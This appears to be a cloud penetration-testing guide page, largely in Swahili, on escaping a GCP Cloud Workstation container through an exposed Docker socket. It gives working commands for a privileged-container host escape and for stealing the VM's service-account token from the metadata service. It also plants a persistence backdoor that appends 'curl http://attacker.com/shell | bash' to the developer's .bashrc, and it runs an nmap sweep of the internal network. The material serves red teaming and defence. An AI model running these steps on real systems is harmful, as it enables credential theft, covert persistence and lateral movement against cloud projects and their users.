# GCP - Cloud Workstations Privesc


### Container Breakout via Docker Socket (Container -> VM -> Project)

Njia kuu ya privilege escalation katika Cloud Workstations inatokana na hitaji la kuunga mkono workflows za **Docker-in-Docker (DinD)** kwa waendelezaji. Wakati usanidi wa workstation unachomeka Docker socket au kuruhusu privileged containers (usanidi wa kawaida), mshambuliaji ndani ya workstation container anaweza kutoroka hadi Compute Engine VM inayokaa chini na kuiba token ya service account yake.

**Prerequisites:**
- Ufikiaji wa terminal ya Cloud Workstation (kupitia SSH, session iliyoathiriwa, au credentials zilizoporwa)
- Usanidi wa workstation lazima uchomeke `/var/run/docker.sock` au kuruhusu privileged containers

**Architecture context:** Workstation ni container (Layer 3) inayokimbia kwenye Docker/Containerd runtime (Layer 2) kwenye GCE VM (Layer 1). Docker socket hutoa ufikiaji wa moja kwa moja kwa container runtime ya host.

> [!NOTE]
> The tool [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) inaotomatisha full container escape na inakupeleka kwenye root shell kwenye host VM.

<details>

<summary>Hatua 1: Angalia Docker socket</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>Hatua 2: Kutoroka kwenye mfumo wa faili wa VM ya mwenyeji</summary>

Tunazindua privileged container, tukimount root directory ya host hadi `/mnt/host`. Pia tunashare network na PID namespace za host ili kuongeza uonekano.
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
Sasa una **root shell on the underlying Compute Engine VM** (Layer 1).

</details>

<details>

<summary>Hatua 3: Iba token ya service account ya VM kutoka IMDS</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **Kagua access scopes!**
> Hata kama Service Account iliyounganishwa ni **Editor**, VM inaweza kuwa imezuiwa na access scopes.
> Ikiwa unaona `https://www.googleapis.com/auth/cloud-platform`, una ruhusa kamili.
> Ikiwa unaona tu `logging.write` na `monitoring.write`, umezuiliwa kwa vector za **Network Pivot** na **Persistence** hapa chini.

<details>

<summary>Step 4: Achieve Persistence (Backdoor the User)</summary>

Cloud Workstations zinaambatisha diski ya kudumu kwenye `/home/user`. Kwa sababu container user (kawaida `user`, UID 1000) anafanana na host user (UID 1000), unaweza kuandika kwenye home directory ya host. Hii inakuwezesha kuweka backdoor katika environment hata kama workstation container itajengwa upya.
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>Hatua 5: Network Pivot (Internal VPC Access)</summary>

Kwa kuwa unashiriki host network namespace (`--net=host`), sasa uko kama trusted node kwenye VPC. Unaweza scan internal services zinazoruhusu access kwa msingi wa IP whitelisting.
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
